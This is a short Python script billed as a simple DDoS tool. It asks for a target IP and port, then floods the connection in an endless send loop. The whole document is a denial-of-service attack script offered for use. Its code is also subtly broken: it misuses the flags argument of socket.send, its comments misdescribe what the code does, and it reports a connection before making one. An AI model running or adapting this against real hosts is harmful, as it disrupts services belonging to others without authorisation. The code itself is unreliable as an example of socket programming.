import socket
import time

print("""                                    _____  _____        _____ 
     /\                            |  __ \|  __ \      / ____|
    /  \   _ __ _ __ _____      __ | |  | | |  | | ___| (___  
   / /\ \ | '__| '__/ _ \ \ /\ / / | |  | | |  | |/ _ \\___ \ 
  / ____ \| |  | | | (_) \ V  V /  | |__| | |__| | (_) |___) |
 /_/    \_\_|  |_|  \___/ \_/\_/   |_____/|_____/ \___/_____/ 
        ||| A simple DDoS tool (NOT POWERFULL) |||   
>>>----------------------------------------------------------->
""")
# Prompt the user for the target IP address and port
target_ip = input('Target IP address >--> ')
target_port = int(input('Target port >--> '))
max_packet_size = 65535
time.sleep(2)
print(" ")
print('[+] Connection established')
print(" ")
print(" ")
time.sleep(2)
print(">>>-- Loading.... ------------------------------------------->")

time.sleep(5)

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the target
s.connect((target_ip, target_port))

# Initialize counter and start time
packet_counter = 0
start_time = time.time()

# Send a large number of packets in a short period of time
while True:
    try:
        # Increase the packet size
        s.send(b'<large_packet>', max_packet_size + 99999999)
        # Decrease the delay between each packet
        time.sleep(0.0000001)
        # Send multiple packets at once
        s.send(b'<additional_packet>', max_packet_size + 99999999)
        s.send(b'<1_packet>', max_packet_size + 99999999)
        s.send(b'<2_packet>', max_packet_size + 45645647)
        s.send(b'<3_packet>', max_packet_size + 99900990)
        s.send(b'<4_packet>', max_packet_size + 99780999)
        s.send(b'<5_packet>', max_packet_size + 99976888)
        s.send(b'<6_packet>', max_packet_size + 68668699)
        s.send(b'<7_packet>', max_packet_size + 99999999)
        s.send(b'<8_packet>', max_packet_size + 23454567)
        s.send(b'<9_packet>', max_packet_size + 34569999)
        s.send(b'<0_packet>', max_packet_size + 99123456)
        packet_counter += 1
        print(f'|-- >Packets sent: {packet_counter}, Speed: {packet_counter/(time.time() - start_time)}')
    except socket.error:
        print(" ")
        print("|||||||||| !!!WARNING!!! ||||||||||||||||||||||||||||||||||")
        print("[!!!] Connection interupted, [reason: couldn't connect] |||")
        print("|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
        break


# Close the connection
s.close()
